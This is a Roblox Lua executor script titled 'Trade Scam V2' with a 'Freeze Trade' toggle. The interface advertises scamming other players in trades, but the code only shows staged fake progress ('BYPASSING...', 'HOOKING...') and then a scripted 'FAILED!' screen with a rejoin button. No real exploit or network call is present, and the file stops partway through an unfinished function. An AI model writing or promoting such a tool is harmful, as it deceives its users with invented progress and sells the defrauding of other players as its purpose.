local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local UserInputService = game:GetService("UserInputService")
local isGlobalProcessing = false

repeat RunService.RenderStepped:Wait() until game:IsLoaded()
task.wait(1)

-- Initial Loading UI with enhanced design
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")

local LoadingScreen = Instance.new("ScreenGui")
LoadingScreen.Name = "CyberLoadingScreen"
LoadingScreen.Parent = CoreGui

-- Enhanced blur effect for cyber feel
local BlurEffect = Instance.new("BlurEffect")
BlurEffect.Size = 15
BlurEffect.Parent = game:GetService("Lighting")

-- Main container
local LoadingContainer = Instance.new("Frame")
LoadingContainer.Name = "LoadingContainer"
LoadingContainer.Size = UDim2.new(0, 500, 0, 250)
LoadingContainer.Position = UDim2.new(0.5, 0, 0.5, 0)
LoadingContainer.AnchorPoint = Vector2.new(0.5, 0.5)
LoadingContainer.BackgroundColor3 = Color3.fromRGB(10, 15, 25)
LoadingContainer.BackgroundTransparency = 0.1
LoadingContainer.Parent = LoadingScreen

-- Cyber grid background
local GridBackground = Instance.new("ImageLabel")
GridBackground.Size = UDim2.new(1, 0, 1, 0)
GridBackground.BackgroundTransparency = 1
GridBackground.Image = "rbxassetid://2698713530"
GridBackground.ImageColor3 = Color3.fromRGB(0, 150, 255)
GridBackground.ImageTransparency = 0.9
GridBackground.Parent = LoadingContainer

-- Holographic effect
local HoloFrame = Instance.new("Frame")
local HoloGradient = Instance.new("UIGradient")
HoloFrame.Size = UDim2.new(1, 0, 1, 0)
HoloFrame.BackgroundTransparency = 0.8
HoloFrame.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
HoloFrame.BorderSizePixel = 0
HoloFrame.Parent = LoadingContainer
HoloGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 200, 255)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 100, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 50, 255))
})
HoloGradient.Parent = HoloFrame

-- Enhanced glow
local Glow = Instance.new("ImageLabel")
Glow.Name = "Glow"
Glow.BackgroundTransparency = 1
Glow.Position = UDim2.new(0.5, 0, 0.5, 0)
Glow.Size = UDim2.new(2, 0, 2, 0)
Glow.AnchorPoint = Vector2.new(0.5, 0.5)
Glow.Image = "rbxassetid://7131311876"
Glow.ImageColor3 = Color3.fromRGB(0, 200, 255)
Glow.ImageTransparency = 0.7
Glow.Parent = LoadingContainer

-- Hexagonal corner style
local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 10)
UICorner.Parent = LoadingContainer

-- Main text with cyber font
local LoadingText = Instance.new("TextLabel")
LoadingText.Name = "LoadingText"
LoadingText.Size = UDim2.new(1, 0, 0.3, 0)
LoadingText.Position = UDim2.new(0, 0, 0.2, 0)
LoadingText.BackgroundTransparency = 1
LoadingText.Text = "Trade Scam V2"
LoadingText.TextColor3 = Color3.fromRGB(0, 255, 255)
LoadingText.TextSize = 36
LoadingText.Font = Enum.Font.SciFi
LoadingText.Parent = LoadingContainer

-- Scanning text effect
local SubText = Instance.new("TextLabel")
SubText.Size = UDim2.new(1, 0, 0.2, 0)
SubText.Position = UDim2.new(0, 0, 0.45, 0)
SubText.BackgroundTransparency = 1
SubText.Text = "LOADING..."
SubText.TextColor3 = Color3.fromRGB(0, 200, 255)
SubText.TextSize = 20
SubText.Font = Enum.Font.Code
SubText.Parent = LoadingContainer

-- Cyber-styled loading bar
local LoadingBar = Instance.new("Frame")
LoadingBar.Name = "LoadingBar"
LoadingBar.Size = UDim2.new(0.8, 0, 0, 8)
LoadingBar.Position = UDim2.new(0.1, 0, 0.7, 0)
LoadingBar.BackgroundColor3 = Color3.fromRGB(20, 30, 40)
LoadingBar.Parent = LoadingContainer

local LoadingBarFill = Instance.new("Frame")
LoadingBarFill.Name = "LoadingBarFill"
LoadingBarFill.Size = UDim2.new(0, 0, 1, 0)
LoadingBarFill.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
LoadingBarFill.Parent = LoadingBar

UICorner:Clone().Parent = LoadingBar
UICorner:Clone().Parent = LoadingBarFill

-- Scanning text animation
local function updateLoadingText()
    local messages = {
        "Loading...",
        "Organizing Remotes...",
        "Loading Modules...",
        "Re-Checking Server Checks...",
        "Sync Data..."
    }
    local dots = {"", ".", "..", "..."}
    local msgIndex = 1
    local dotIndex = 1
    
    while LoadingScreen.Parent do
        SubText.Text = messages[msgIndex] .. dots[dotIndex]
        dotIndex = dotIndex % #dots + 1
        if dotIndex == 1 then
            msgIndex = msgIndex % #messages + 1
        end
        task.wait(0.3)
    end
end
task.spawn(updateLoadingText)

-- Multiple loading stages
local function animateLoading()
    local stages = {
        {duration = 2, progress = 0.3},
        {duration = 1.5, progress = 0.5},
        {duration = 2, progress = 0.7},
        {duration = 1.5, progress = 0.85},
        {duration = 2, progress = 1}
    }
    
    for _, stage in ipairs(stages) do
        local stageTween = TweenService:Create(
            LoadingBarFill,
            TweenInfo.new(stage.duration, Enum.EasingStyle.Quad),
            {Size = UDim2.new(stage.progress, 0, 1, 0)}
        )
        stageTween:Play()
        stageTween.Completed:Wait()
        task.wait(0.5) -- Pause between stages
    end
    
    task.wait(1) -- Final pause
    LoadingScreen:Destroy()
    BlurEffect:Destroy()
end
task.spawn(animateLoading)

-- Pulsing glow animation
local function animateGlow()
    while LoadingScreen.Parent do
        local glowTween = TweenService:Create(
            Glow,
            TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
            {ImageTransparency = 0.5}
        )
        glowTween:Play()
        glowTween.Completed:Wait()
        
        glowTween = TweenService:Create(
            Glow,
            TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
            {ImageTransparency = 0.8}
        )
        glowTween:Play()
        glowTween.Completed:Wait()
    end
end
task.spawn(animateGlow)

task.wait(13)

local function createPromptMessage(text)
    local TweenService = game:GetService("TweenService")
    local CoreGui = game:GetService("CoreGui")
    
    local gui = Instance.new("ScreenGui")
    gui.Name = "CyberPromptMessage"
    gui.Parent = CoreGui
    
    local blur = Instance.new("BlurEffect")
    blur.Size = 0
    blur.Parent = game.Lighting
    
    local container = Instance.new("Frame")
    container.Size = UDim2.new(0, 0, 0, 0)
    container.Position = UDim2.new(0.5, 0, 0.2, 0)
    container.AnchorPoint = Vector2.new(0.5, 0.5)
    container.BackgroundColor3 = Color3.fromRGB(10, 12, 20)
    container.BorderSizePixel = 0
    container.Parent = gui
    
    -- Text container for glitch effect
    local textContainer = Instance.new("Frame")
    textContainer.Size = UDim2.new(1, -60, 1, -60)
    textContainer.Position = UDim2.new(0, 30, 0, 30)
    textContainer.BackgroundTransparency = 1
    textContainer.ClipsDescendants = true
    textContainer.Parent = container
    
    -- Main text
    local message = Instance.new("TextLabel")
    message.Size = UDim2.new(1, 0, 1, 0)
    message.BackgroundTransparency = 1
    message.Text = ""  -- Will be filled character by character
    message.TextColor3 = Color3.fromRGB(0, 225, 255)
    message.TextScaled = true
    message.Font = Enum.Font.Code
    message.TextWrapped = true
    message.TextTransparency = 0
    message.Parent = textContainer
    
    -- Glitch shadow text (red channel) - reduced offset
    local glitchTextRed = message:Clone()
    glitchTextRed.TextColor3 = Color3.fromRGB(255, 0, 0)
    glitchTextRed.Position = UDim2.new(0, 1, 0, 0)  -- Reduced from 2 to 1
    glitchTextRed.TextTransparency = 0.7  -- Added transparency
    glitchTextRed.Parent = textContainer
    
    -- Glitch shadow text (blue channel) - reduced offset
    local glitchTextBlue = message:Clone()
    glitchTextBlue.TextColor3 = Color3.fromRGB(0, 0, 255)
    glitchTextBlue.Position = UDim2.new(0, -1, 0, 0)  -- Reduced from -2 to -1
    glitchTextBlue.TextTransparency = 0.7  -- Added transparency
    glitchTextBlue.Parent = textContainer
    
    -- [Rest of the UI elements remain the same until the animation functions]
    local border = Instance.new("UIStroke")
    border.Color = Color3.fromRGB(0, 225, 255)
    border.Thickness = 2
    border.Transparency = 1
    border.Parent = container
    
    local outerGlow = Instance.new("ImageLabel")
    outerGlow.Size = UDim2.new(1.3, 0, 1.3, 0)
    outerGlow.Position = UDim2.new(0.5, 0, 0.5, 0)
    outerGlow.AnchorPoint = Vector2.new(0.5, 0.5)
    outerGlow.BackgroundTransparency = 1
    outerGlow.Image = "rbxassetid://6015897843"
    outerGlow.ImageColor3 = Color3.fromRGB(0, 225, 255)
    outerGlow.ImageTransparency = 1
    outerGlow.Parent = container
    
    -- Decorative elements
    local cornerDecor1 = Instance.new("Frame")
    cornerDecor1.Size = UDim2.new(0, 40, 0, 2)
    cornerDecor1.Position = UDim2.new(0, -5, 0, -5)
    cornerDecor1.BackgroundColor3 = Color3.fromRGB(0, 225, 255)
    cornerDecor1.BorderSizePixel = 0
    cornerDecor1.Parent = container
    
    local cornerDecor2 = Instance.new("Frame")
    cornerDecor2.Size = UDim2.new(0, 2, 0, 40)
    cornerDecor2.Position = UDim2.new(0, -5, 0, -5)
    cornerDecor2.BackgroundColor3 = Color3.fromRGB(0, 225, 255)
    cornerDecor2.BorderSizePixel = 0
    cornerDecor2.Parent = container
    
    local scanline = Instance.new("Frame")
    scanline.Size = UDim2.new(1, 0, 0, 2)
    scanline.BackgroundColor3 = Color3.fromRGB(0, 225, 255)
    scanline.BackgroundTransparency = 0.8
    scanline.BorderSizePixel = 0
    scanline.Parent = container
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = container
    
    -- Modified typewriter effect with reduced glitch
    local function typewriterEffect()
        local chars = string.split(text, "")
        local displayText = ""
        
        for i, char in ipairs(chars) do
            displayText = displayText .. char
            message.Text = displayText
            glitchTextRed.Text = displayText
            glitchTextBlue.Text = displayText
            
            -- Reduced glitch chance and magnitude
            if math.random() < 0.15 then  -- Reduced from 0.3
                glitchTextRed.Position = UDim2.new(0, math.random(-2, 2), 0, math.random(-1, 1))  -- Reduced range
                glitchTextBlue.Position = UDim2.new(0, math.random(-2, 2), 0, math.random(-1, 1))  -- Reduced range
                wait(0.02)
                glitchTextRed.Position = UDim2.new(0, 1, 0, 0)  -- Return to subtle offset
                glitchTextBlue.Position = UDim2.new(0, -1, 0, 0)  -- Return to subtle offset
            end
            
            task.wait(0.001)  -- Typing speed
        end
    end
    
    -- Modified glitch animation with reduced frequency and magnitude
    local function playGlitchAnimation()
        while container.Parent do
            if math.random() < 0.05 then  -- Reduced from 0.1
                local offset = math.random(-3, 3)  -- Reduced from -5,5
                local glitchDuration = math.random(5, 10) / 100  -- Reduced duration
                
                glitchTextRed.Position = UDim2.new(0, offset, 0, math.random(-1, 1))  -- Reduced vertical range
                glitchTextBlue.Position = UDim2.new(0, -offset, 0, math.random(-1, 1))  -- Reduced vertical range
                
                wait(glitchDuration)
                
                glitchTextRed.Position = UDim2.new(0, 1, 0, 0)  -- Return to subtle offset
                glitchTextBlue.Position = UDim2.new(0, -1, 0, 0)  -- Return to subtle offset
            end
            task.wait(0.2)  -- Increased wait time between checks
        end
    end
    
    local function playScanlineAnimation()
        while container.Parent do
            local scanTween = TweenService:Create(scanline, TweenInfo.new(2, Enum.EasingStyle.Linear), {
                Position = UDim2.new(0, 0, 1, 0)
            })
            scanTween:Play()
            wait(2)
            scanline.Position = UDim2.new(0, 0, 0, 0)
        end
    end
    
    -- Opening animation sequence
    local openTween = TweenService:Create(container, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Size = UDim2.new(0, 400, 0, 200)
    })
    
    local blurTween = TweenService:Create(blur, TweenInfo.new(0.3), {
        Size = 10
    })
    
    local borderTween = TweenService:Create(border, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
        Transparency = 0
    })
    
    local glowTween = TweenService:Create(outerGlow, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
        ImageTransparency = 0.7
    })
    
    -- Play animations
    openTween:Play()
    blurTween:Play()
    borderTween:Play()
    glowTween:Play()
    
    openTween.Completed:Connect(function()
        coroutine.wrap(typewriterEffect)()
        coroutine.wrap(playGlitchAnimation)()
        coroutine.wrap(playScanlineAnimation)()
    end)
    
    return gui
end

local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 8)

local isGlobalProcessing = false

local function CreateUI()
    local MainUI = Instance.new("ScreenGui")
    MainUI.Name = "CyberTechUI"
    MainUI.Parent = CoreGui
    
    -- Main Frame with cyber aesthetic
    local MainFrame = Instance.new("Frame")
    MainFrame.Size = UDim2.new(0, 340, 0, 440)
    MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
    MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
    MainFrame.Parent = MainUI
    
    -- Cyber border effect
    local BorderFrame = Instance.new("Frame")
    BorderFrame.Size = UDim2.new(1.02, 0, 1.02, 0)
    BorderFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
    BorderFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    BorderFrame.BackgroundTransparency = 0.7
    BorderFrame.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
    BorderFrame.Parent = MainFrame
    UICorner:Clone().Parent = BorderFrame
    
    -- Neon glow effect
    local GlowEffect = Instance.new("ImageLabel")
    GlowEffect.Size = UDim2.new(1.3, 0, 1.3, 0)
    GlowEffect.Position = UDim2.new(0.5, 0, 0.5, 0)
    GlowEffect.AnchorPoint = Vector2.new(0.5, 0.5)
    GlowEffect.BackgroundTransparency = 1
    GlowEffect.Image = "rbxassetid://6015897843"
    GlowEffect.ImageColor3 = Color3.fromRGB(0, 200, 255)
    GlowEffect.ImageTransparency = 0.85
    GlowEffect.Parent = MainFrame
    
    -- Cyber pattern background
    local Pattern = Instance.new("ImageLabel")
    Pattern.Size = UDim2.new(1, 0, 1, 0)
    Pattern.BackgroundTransparency = 1
    Pattern.Image = "rbxassetid://6768983272"
    Pattern.ImageColor3 = Color3.fromRGB(0, 150, 255)
    Pattern.ImageTransparency = 0.95
    Pattern.Parent = MainFrame
    
    -- Dragging functionality
    local dragging, dragInput, dragStart, startPos
    local function update(input)
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end

    MainFrame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = MainFrame.Position
            
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    MainFrame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            update(input)
        end
    end)
    
    -- Main UI elements
    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(1, 0, 0, 60)
    Title.BackgroundTransparency = 1
    Title.Text = "TRADE SCAM V2"
    Title.TextColor3 = Color3.fromRGB(0, 255, 255)
    Title.TextSize = 28
    Title.Font = Enum.Font.GothamBold
    Title.Parent = MainFrame
    
    -- Cyberpunk-style underline
    local underline = Instance.new("Frame")
    underline.Size = UDim2.new(0, 0, 0, 2)
    underline.Position = UDim2.new(0.5, 0, 0, 55)
    underline.AnchorPoint = Vector2.new(0.5, 0)
    underline.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
    underline.Parent = Title
    
    -- Animated underline gradient
    local underlineGradient = Instance.new("UIGradient")
    underlineGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 255)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 150, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 255))
    })
    underlineGradient.Parent = underline
    
    -- Animate underline and gradient
    TweenService:Create(underline, TweenInfo.new(0.8, Enum.EasingStyle.Quart), {
        Size = UDim2.new(0.8, 0, 0, 2)
    }):Play()
    
    local gradientTween = TweenService:Create(underlineGradient, TweenInfo.new(2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), {
        Offset = Vector2.new(1, 0)
    })
    gradientTween:Play()
    
    local function createCyberToggle(name, position)
        local ToggleContainer = Instance.new("Frame")
        ToggleContainer.Size = UDim2.new(0.85, 0, 0, 45)
        ToggleContainer.Position = position
        ToggleContainer.AnchorPoint = Vector2.new(0.5, 0)
        ToggleContainer.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
        ToggleContainer.Parent = MainFrame
        
        -- Toggle container effects
        local containerBorder = Instance.new("Frame")
        containerBorder.Size = UDim2.new(1.02, 0, 1.1, 0)
        containerBorder.Position = UDim2.new(0.5, 0, 0.5, 0)
        containerBorder.AnchorPoint = Vector2.new(0.5, 0.5)
        containerBorder.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
        containerBorder.BackgroundTransparency = 0.8
        containerBorder.Parent = ToggleContainer
        UICorner:Clone().Parent = containerBorder
        
        local ToggleLabel = Instance.new("TextLabel")
        ToggleLabel.Size = UDim2.new(0.7, 0, 1, 0)
        ToggleLabel.BackgroundTransparency = 1
        ToggleLabel.Text = name
        ToggleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        ToggleLabel.TextSize = 16
        ToggleLabel.Font = Enum.Font.GothamSemibold
        ToggleLabel.Parent = ToggleContainer
        
        local ToggleButton = Instance.new("Frame")
        ToggleButton.Size = UDim2.new(0, 44, 0, 24)
        ToggleButton.Position = UDim2.new(0.85, 0, 0.5, 0)
        ToggleButton.AnchorPoint = Vector2.new(0.5, 0.5)
        ToggleButton.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
        ToggleButton.Parent = ToggleContainer
        
        -- Cyber toggle effects
        local buttonBorder = Instance.new("Frame")
        buttonBorder.Size = UDim2.new(1.1, 0, 1.2, 0)
        buttonBorder.Position = UDim2.new(0.5, 0, 0.5, 0)
        buttonBorder.AnchorPoint = Vector2.new(0.5, 0.5)
        buttonBorder.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
        buttonBorder.BackgroundTransparency = 0.8
        buttonBorder.Parent = ToggleButton
        
        local ToggleCircle = Instance.new("Frame")
        ToggleCircle.Size = UDim2.new(0, 18, 0, 18)
        ToggleCircle.Position = UDim2.new(0, 3, 0.5, 0)
        ToggleCircle.AnchorPoint = Vector2.new(0, 0.5)
        ToggleCircle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        ToggleCircle.Parent = ToggleButton
        
        -- Circle glow effect
        local circleGlow = Instance.new("ImageLabel")
        circleGlow.Size = UDim2.new(1.5, 0, 1.5, 0)
        circleGlow.Position = UDim2.new(0.5, 0, 0.5, 0)
        circleGlow.AnchorPoint = Vector2.new(0.5, 0.5)
        circleGlow.BackgroundTransparency = 1
        circleGlow.Image = "rbxassetid://6015897843"
        circleGlow.ImageColor3 = Color3.fromRGB(0, 255, 255)
        circleGlow.ImageTransparency = 0.8
        circleGlow.Parent = ToggleCircle
        
        UICorner:Clone().Parent = ToggleContainer
        UICorner:Clone().Parent = buttonBorder
        
        local circleCorner = UICorner:Clone()
        circleCorner.CornerRadius = UDim.new(1, 0)
        circleCorner.Parent = ToggleCircle
        
        local buttonCorner = UICorner:Clone()
        buttonCorner.CornerRadius = UDim.new(1, 0)
        buttonCorner.Parent = ToggleButton
        
        local isOn = false
        local isProcessing = false
        
        local function toggle()
            if isProcessing or isGlobalProcessing then return end
            isProcessing = true
            isGlobalProcessing = true
            
            isOn = not isOn
            local toggleColor = isOn and Color3.fromRGB(0, 255, 255) or Color3.fromRGB(35, 35, 45)
            local togglePos = isOn and UDim2.new(1, -21, 0.5, 0) or UDim2.new(0, 3, 0.5, 0)
            local glowTransparency = isOn and 0.6 or 0.8
            
            TweenService:Create(ToggleButton, TweenInfo.new(0.3), {
                BackgroundColor3 = toggleColor
            }):Play()
            
            TweenService:Create(ToggleCircle, TweenInfo.new(0.3), {
                Position = togglePos
            }):Play()
            
            TweenService:Create(circleGlow, TweenInfo.new(0.3), {
                ImageTransparency = glowTransparency
            }):Play()
            
            if isOn then
                -- Create cyber-styled loading screen
                local loadingGui = Instance.new("ScreenGui")
                loadingGui.Parent = CoreGui
                
                local loadingFrame = Instance.new("Frame")
                loadingFrame.Size = UDim2.new(1, 0, 1, 0)
                loadingFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                loadingFrame.BackgroundTransparency = 0.3
                loadingFrame.Parent = loadingGui
                
                local loadingContainer = Instance.new("Frame")
                loadingContainer.Size = UDim2.new(0, 340, 0, 180)
                loadingContainer.Position = UDim2.new(0.5, 0, 0.5, 0)
                loadingContainer.AnchorPoint = Vector2.new(0.5, 0.5)
                loadingContainer.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
                loadingContainer.Parent = loadingFrame
                
                -- Cyber container effects
                local loadingBorder = Instance.new("Frame")
                loadingBorder.Size = UDim2.new(1.02, 0, 1.02, 0)
                loadingBorder.Position = UDim2.new(0.5, 0, 0.5, 0)
                loadingBorder.AnchorPoint = Vector2.new(0.5, 0.5)
                loadingBorder.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
                loadingBorder.BackgroundTransparency = 0.7
                loadingBorder.Parent = loadingContainer
                
                local loadingGlow = Instance.new("ImageLabel")
                loadingGlow.Size = UDim2.new(1.3, 0, 1.3, 0)
                loadingGlow.Position = UDim2.new(0.5, 0, 0.5, 0)
                loadingGlow.AnchorPoint = Vector2.new(0.5, 0.5)
                loadingGlow.BackgroundTransparency = 1
                loadingGlow.Image = "rbxassetid://6015897843"
                loadingGlow.ImageColor3 = Color3.fromRGB(0, 200, 255)
                loadingGlow.ImageTransparency = 0.85
                loadingGlow.Parent = loadingContainer
                
                UICorner:Clone().Parent = loadingContainer
                UICorner:Clone().Parent = loadingBorder
                
                local loadingText = Instance.new("TextLabel")
                loadingText.Size = UDim2.new(1, 0, 0, 50)
                loadingText.Position = UDim2.new(0, 0, 0.2, 0)
                loadingText.BackgroundTransparency = 1
                loadingText.Text = "BYPASSING..."
                loadingText.TextColor3 = Color3.fromRGB(0, 255, 255)
                loadingText.TextSize = 28
                loadingText.Font = Enum.Font.GothamBold
                loadingText.Parent = loadingContainer
                
                local loadingBar = Instance.new("Frame")
                loadingBar.Size = UDim2.new(0.8, 0, 0, 8)
                loadingBar.Position = UDim2.new(0.1, 0, 0.7, 0)
                loadingBar.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
                loadingBar.Parent = loadingContainer
                
                local loadingBarFill = Instance.new("Frame")
                loadingBarFill.Size = UDim2.new(0, 0, 1, 0)
                loadingBarFill.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
                loadingBarFill.Parent = loadingBar
                
                -- Loading bar effects
                local barBorder = Instance.new("Frame")
                barBorder.Size = UDim2.new(1.02, 0, 1.5, 0)
                barBorder.Position = UDim2.new(0.5, 0, 0.5, 0)
                barBorder.AnchorPoint = Vector2.new(0.5, 0.5)
                barBorder.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
                barBorder.BackgroundTransparency = 0.7
                barBorder.Parent = loadingBar
                
                local barGradient = Instance.new("UIGradient")
                barGradient.Color = ColorSequence.new({
                    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 255)),
                    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 150, 255)),
                    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 255))
                })
                barGradient.Parent = loadingBarFill
                
                UICorner:Clone().Parent = loadingBar
                UICorner:Clone().Parent = loadingBarFill
                UICorner:Clone().Parent = barBorder
                
                -- Animate loading bar
                local barTween = TweenService:Create(loadingBarFill, TweenInfo.new(15), {
                    Size = UDim2.new(1, 0, 1, 0)
                })
                barTween:Play()
                
                -- Animate gradient
                local gradientTween = TweenService:Create(barGradient, TweenInfo.new(2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), {
                    Offset = Vector2.new(1, 0)
                })
                gradientTween:Play()
                
                task.wait(15)
                loadingText.Text = "HOOKING..."
                task.wait(15)
                
                loadingGui:Destroy()
                MainUI:Destroy()
                
                -- Create cyber-styled fail message
                local failGui = Instance.new("ScreenGui")
                failGui.Parent = CoreGui
                
                local failFrame = Instance.new("Frame")
                failFrame.Size = UDim2.new(0, 340, 0, 240)
                failFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
                failFrame.AnchorPoint = Vector2.new(0.5, 0.5)
                failFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
                failFrame.Parent = failGui
                
                -- Fail frame effects
                local failBorder = Instance.new("Frame")
                failBorder.Size = UDim2.new(1.02, 0, 1.02, 0)
                failBorder.Position = UDim2.new(0.5, 0, 0.5, 0)
                failBorder.AnchorPoint = Vector2.new(0.5, 0.5)
                failBorder.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
                failBorder.BackgroundTransparency = 0.7
                failBorder.Parent = failFrame
                
                local failGlow = Instance.new("ImageLabel")
                failGlow.Size = UDim2.new(1.3, 0, 1.3, 0)
                failGlow.Position = UDim2.new(0.5, 0, 0.5, 0)
                failGlow.AnchorPoint = Vector2.new(0.5, 0.5)
                failGlow.BackgroundTransparency = 1
                failGlow.Image = "rbxassetid://6015897843"
                failGlow.ImageColor3 = Color3.fromRGB(255, 0, 0)
                failGlow.ImageTransparency = 0.85
                failGlow.Parent = failFrame
                
                UICorner:Clone().Parent = failFrame
                UICorner:Clone().Parent = failBorder
                
                local failText = Instance.new("TextLabel")
                failText.Size = UDim2.new(1, 0, 0.3, 0)
                failText.Position = UDim2.new(0, 0, 0.1, 0)
                failText.BackgroundTransparency = 1
                failText.Text = "FAILED!"
                failText.TextColor3 = Color3.fromRGB(255, 0, 0)
                failText.TextSize = 36
                failText.Font = Enum.Font.GothamBold
                failText.Parent = failFrame
                
                local subText = Instance.new("TextLabel")
                subText.Size = UDim2.new(1, 0, 0.2, 0)
                subText.Position = UDim2.new(0, 0, 0.35, 0)
                subText.BackgroundTransparency = 1
                subText.Text = "Please - Rejoin, and try again."
                subText.TextColor3 = Color3.fromRGB(255, 255, 255)
                subText.TextSize = 20
                subText.Font = Enum.Font.GothamMedium
                subText.Parent = failFrame
                
                local rejoinButton = Instance.new("TextButton")
                rejoinButton.Size = UDim2.new(0.8, 0, 0, 45)
                rejoinButton.Position = UDim2.new(0.5, 0, 0.7, 0)
                rejoinButton.AnchorPoint = Vector2.new(0.5, 0)
                rejoinButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
                rejoinButton.Text = "REJOIN"
                rejoinButton.TextColor3 = Color3.fromRGB(255, 255, 255)
                rejoinButton.TextSize = 24
                rejoinButton.Font = Enum.Font.GothamBold
                rejoinButton.Parent = failFrame
                
                -- Rejoin button effects
                local buttonBorder = Instance.new("Frame")
                buttonBorder.Size = UDim2.new(1.02, 0, 1.1, 0)
                buttonBorder.Position = UDim2.new(0.5, 0, 0.5, 0)
                buttonBorder.AnchorPoint = Vector2.new(0.5, 0.5)
                buttonBorder.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
                buttonBorder.BackgroundTransparency = 0.7
                buttonBorder.Parent = rejoinButton
                
                local buttonGlow = Instance.new("ImageLabel")
                buttonGlow.Size = UDim2.new(1.2, 0, 1.2, 0)
                buttonGlow.Position = UDim2.new(0.5, 0, 0.5, 0)
                buttonGlow.AnchorPoint = Vector2.new(0.5, 0.5)
                buttonGlow.BackgroundTransparency = 1
                buttonGlow.Image = "rbxassetid://6015897843"
                buttonGlow.ImageColor3 = Color3.fromRGB(255, 0, 0)
                buttonGlow.ImageTransparency = 0.85
                buttonGlow.Parent = rejoinButton
                
                UICorner:Clone().Parent = rejoinButton
                UICorner:Clone().Parent = buttonBorder
                
                -- Button hover effects
                rejoinButton.MouseEnter:Connect(function()
                    TweenService:Create(rejoinButton, TweenInfo.new(0.3), {
                        BackgroundColor3 = Color3.fromRGB(200, 0, 0)
                    }):Play()
                    TweenService:Create(buttonGlow, TweenInfo.new(0.3), {
                        ImageTransparency = 0.7
                    }):Play()
                end)
                
                rejoinButton.MouseLeave:Connect(function()
                    TweenService:Create(rejoinButton, TweenInfo.new(0.3), {
                        BackgroundColor3 = Color3.fromRGB(255, 0, 0)
                    }):Play()
                    TweenService:Create(buttonGlow, TweenInfo.new(0.3), {
                        ImageTransparency = 0.85
                    }):Play()
                end)
                
                rejoinButton.MouseButton1Click:Connect(function()
                    game:GetService("TeleportService"):Teleport(game.PlaceId)
                end)
            end
            
            task.wait(0.3)
            isProcessing = false
            isGlobalProcessing = false
        end
        
        ToggleButton.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                toggle()
            end
        end)
        
        -- Container hover effects
        ToggleContainer.MouseEnter:Connect(function()
            TweenService:Create(ToggleContainer, TweenInfo.new(0.3), {
                BackgroundColor3 = Color3.fromRGB(35, 35, 45)
            }):Play()
            TweenService:Create(containerBorder, TweenInfo.new(0.3), {
                BackgroundTransparency = 0.6
            }):Play()
        end)
        
        ToggleContainer.MouseLeave:Connect(function()
            TweenService:Create(ToggleContainer, TweenInfo.new(0.3), {
                BackgroundColor3 = Color3.fromRGB(25, 25, 35)
            }):Play()
            TweenService:Create(containerBorder, TweenInfo.new(0.3), {
                BackgroundTransparency = 0.8
            }):Play()
        end)
    end
    
    -- Create toggles with spacing
    createCyberToggle("Freeze Trade", UDim2.new(0.5, 0, 0.25, 0))
